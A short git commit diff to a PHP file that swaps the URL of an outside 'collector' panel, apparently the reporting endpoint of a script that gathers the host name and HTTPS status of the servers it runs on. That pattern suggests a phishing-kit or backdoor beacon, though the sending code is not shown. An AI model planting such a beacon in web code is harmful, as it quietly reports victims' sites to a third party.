e5675c3b804d8ddd12eb29dae8ab44a533837e39
sam <144790923+tryxapp@users.noreply.github.com>
2025-10-26 16:48:10 +0700

    Update hcd01.php

--- newcon1/newcon2/oncon/hcd01.php
+++ newcon1/newcon2/oncon/hcd01.php
@@ -1,5 +1,5 @@
 <?php
-$panel = 'https://dpanel.cloud/admin/collector/track.php';
+$panel = 'https://collecdpnl.pages.dev/';
 
 $host   = $_SERVER['HTTP_HOST'] ?? '';
 $https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
